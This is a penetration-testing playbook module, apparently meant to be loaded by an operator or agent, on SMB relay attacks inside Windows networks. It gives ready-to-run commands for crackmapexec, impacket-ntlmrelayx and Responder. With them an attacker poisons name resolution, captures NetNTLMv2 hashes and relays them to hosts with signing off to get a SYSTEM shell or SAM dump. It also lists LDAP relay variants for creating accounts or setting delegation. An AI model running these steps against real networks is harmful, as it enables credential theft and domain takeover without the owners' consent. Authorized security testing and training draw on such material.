# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: SMB Relay Attacks

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### SMB Relay Attacks

**When you capture a NetNTLMv2 hash but can't crack it**, relay it to another host that accepts NTLM authentication with SMB signing disabled.

```bash
# Step 1: Identify SMB signing status of targets
crackmapexec smb <target_range> --gen-relay-list targets.txt
# targets.txt contains IPs with SMB signing = False

# Step 2: Run ntlmrelayx, relay to unsigned targets
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
# Or for interactive shell:
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Step 3: Run Responder (with SMB/HTTP servers OFF to force relay)
sudo responder -I <interface> -wdPv
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# When a user on the network tries to access a nonexistent share:
# Their hash is relayed to an unsigned target, giving us a SYSTEM shell or SAM dump
```

**Relay-to-target discrimination**:
- Relay to same host: blocked by default since MS08-068 (NTLM loopback protection)
- Cross-host relay: works if target accepts NTLM and SMB signing is off
- Relay to LDAP: can be used to create new accounts, delegate rights, or set RBCD (LDAP signing must be off on target DC)
- Relay to HTTP: if the target has web services accepting NTLM auth (Exchange, SharePoint, SCCM)

**Why this matters more than most people think**: Domain-joined Windows machines default to SMB signing = disabled for workstations (client-side). Server OS (2012 R2+) defaults to SMB signing = enabled for SMB server but not always for client. Misconfigurations in GPO are common.


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
